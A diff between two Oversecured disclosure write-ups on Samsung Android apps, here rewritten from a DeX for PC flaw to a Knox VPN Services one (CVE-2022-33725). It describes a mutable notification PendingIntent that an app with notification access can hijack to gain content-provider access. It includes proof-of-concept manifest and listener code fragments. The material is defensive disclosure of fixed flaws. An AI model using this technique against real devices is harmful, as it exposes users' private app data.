@@ -3,15 +3,15 @@
 <table>
     <tr>
         <td>Name</td>
-        <td>DeX for PC</td>
+        <td>Knox VPN Services</td>
     </tr>
     <tr>
         <td>Package name</td>
-        <td><code>com.sec.android.app.dexonpc</code></td>
+        <td><code>com.samsung.sVpn</code></td>
     </tr>
     <tr>
         <td>Reported date</td>
-        <td>2022.03.29</td>
+        <td>2022.04.18</td>
     </tr>
     <tr>
         <td>Fixed date</td>
@@ -23,11 +23,11 @@
     </tr>
     <tr>
         <td>Handle</td>
-        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-33721">CVE-2022-33721</a> (SVE-2022-0788)</td>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-33725">CVE-2022-33725</a> (SVE-2022-0953)</td>
     </tr>
     <tr>
         <td>Reward</td>
-        <td>$2160</td>
+        <td>$1150</td>
     </tr>
 </table>
 
@@ -36,7 +36,7 @@
 Oversecured report:
 ![](Oversecured_report.png)
 
-Oversecured found the use of an implicit intent to create a `PendingIntent` object for notifications without using the `PendingIntent.FLAG_IMMUTABLE` flag. The attacker's app, if it had access to app notifications, could intercept them and redirect them to its activity, before making it grant access permissions to content providers with the `android:grantUriPermissions="true"` flag.
+Oversecured found the use of an implicit intent to create a `PendingIntent` object for notifications without using the `PendingIntent.FLAG_IMMUTABLE` flag. The attacker's app, if it had access to app notifications, could intercept them and redirect them to its activity, before making it grant access rights to content providers with the `android:grantUriPermissions="true"` flag.
 
 **Proof of Concept**
 
@@ -51,11 +51,9 @@ File `AndroidManifest.xml`:
 ```xml
 <activity android:name=".InterceptActivity" android:exported="true">
     <intent-filter>
-        <action android:name="android.intent.action.VIEW" />
-        <category android:name="android.intent.category.BROWSABLE" />
-        <category android:name="android.intent.category.DEFAULT" />
-        <data android:scheme="https" android:host="help.content.samsung.com" android:pathPrefix="/csweb/auth/gosupport.do" />
+        <action android:name="smth" />
         <category android:name="smth" />
+        <category android:name="android.intent.category.DEFAULT" />
     </intent-filter>
 </activity>
 ```
@@ -74,7 +72,7 @@ public void onNotificationPosted(StatusBarNotification sbn, NotificationListener
         return;
     }
     try {
-        Intent fillin = new Intent();
+        Intent fillin = new Intent("smth");
         fillin.addCategory("smth");
         fillin.setClipData(getClipData());
         fillin.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
@@ -109,11 +107,3 @@ As a result, when the app displays this notification, the attacking app automati
 ## References
 
 - [Oversecured Blog. Gaining access to arbitrary* Content Providers](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/)
-
-## Conclusion
-
-Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 
-
-At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.
-
-Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.
